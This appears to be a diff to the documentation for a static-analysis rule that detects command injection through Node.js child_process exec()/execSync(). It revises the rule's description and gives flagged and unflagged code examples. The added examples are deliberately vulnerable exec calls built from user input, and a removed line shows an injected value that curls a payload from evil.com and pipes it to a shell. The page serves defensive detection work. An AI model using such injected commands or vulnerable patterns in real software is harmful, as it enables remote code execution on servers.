@@ -1,6 +1,6 @@
 ---
 title: "VNX-NODE-003 – Command Injection via child_process"
-description: "Detects child_process.exec() and execSync() calls that use template literals or string concatenation, which enable OS command injection when arguments contain user input."
+description: "Reports child_process exec()/execSync() called with a command built by template-literal interpolation or concatenation, or a variable assigned such a string or a request value nearby."
 ---
 
 ## Overview
@@ -21,22 +21,27 @@ OWASP ASVS v4 requirement **V5.3.8** states: "Verify that the application does n
 
 ## What Gets Flagged
 
-The rule matches lines where `exec(` or `execSync(` appears alongside a template literal interpolation (`${`) or string concatenation (`+`).
+A call that resolves to `child_process` `exec`/`execSync` (module binding, destructured or aliased import, `require('child_process').exec`, or a `promisify(exec)` wrapper) whose command is built at run time:
 
 ```javascript
-// FLAGGED: template literal interpolation in exec
 const { exec } = require('child_process');
-app.get('/convert', (req, res) => {
-  exec(`convert ${req.query.file} output.png`, (err, stdout) => {
-    res.send(stdout);
-  });
-});
+// FLAGGED: template literal interpolation
+exec(`ping -c 1 ${req.query.host}`, cb);
 
-// FLAGGED: string concatenation in execSync
-const result = execSync('git log ' + req.params.branch);
+import * as cp from "node:child_process";
+// FLAGGED: concatenation
+cp.execSync("convert " + file + " -resize 64x64 png:-");
+
+// FLAGGED: two-line form
+const cmd = `git log --oneline ${branch}`;
+child_process.exec(cmd, done);
+
+// FLAGGED: promisified and aliased
+const execAsync = promisify(exec);
+await execAsync(`tar -xzf uploads/${name}`);
 ```
 
-An attacker sends `?file=input.jpg; curl https://evil.com/payload | sh` and the shell executes both the `convert` command and the injected curl.
+Not flagged: `re.exec(...)`, `db.exec(...)` and any other object's `exec`, `execFile`/`spawn` with an argument array, constant commands such as `execSync('git rev-parse HEAD')`, and the pattern in comments or string literals. `spawn(..., { shell: true })` is covered by VNX-NODE-026 and shelljs by VNX-NODE-022.
 
 ## Remediation
 
